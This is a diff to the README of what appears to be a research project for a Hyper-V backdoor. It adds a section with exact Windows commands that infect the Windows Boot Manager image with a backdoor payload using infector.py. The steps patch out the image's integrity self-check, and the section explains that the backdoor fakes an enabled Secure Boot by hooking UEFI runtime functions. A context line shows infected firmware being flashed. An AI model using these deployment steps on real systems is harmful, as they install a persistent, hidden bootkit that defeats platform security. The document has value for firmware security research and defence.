@@ -123,6 +123,43 @@ After that you have to replace original driver image with `Bds_infected.efi` one
 > flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
 ```
 
+## Deploying the backdoor using Windows Boot Manager infection
+
+In case when you don't have any specialized hardware and also when you don't have ability to run signed Kaspersky bootloader on your system with Secure Boot enabled you can disable Secure Boot and deploy Hyper-V backdoor using Windows Boot Manager image file infection. In this case Hyper-V backdoor driver will emulate enabled Secure Boot by hooking of UEFI runtime functions so infected system will able to load all virtualization-based security features just as usual.
+
+To infect Windows Boot Manager you have to perform the following steps.
+
+Mount EFI system partition where Windows Boot Manager image file is stored:
+
+```
+C:\> mountvol S: /S
+```
+
+Backup original image file:
+
+```
+C:\> copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw_orig.efi
+```
+
+Infect original image file with Hyper-V backdoor:
+
+```
+C:\> python .\infector.py --patch-integrity-checks --payload .\DmaBackdoorHv_X64.efi ^ 
+     --infect S:\EFI\Microsoft\Boot\bootmgfw_orig.efi ^
+     --output S:\EFI\Microsoft\Boot\bootmgfw.efi
+```
+
+Unmount EFI system partition
+
+```
+C:\> mountvol S: /D
+```
+
+After that you can restart your system, disable Secure Boot in setup menu and boot into the Windows.
+
+Please pay attention that passing of `--patch-integrity-checks` command line option to the `infector.py` program is mandatory to disable self check of Windows Boot Manager image integrity, in other case it will not able to boot.
+
+
 ## Basic usage
 
 Client program `backdoor_client.exe` is used to interact with the backdoor from Hyper-V guest or host partition. 
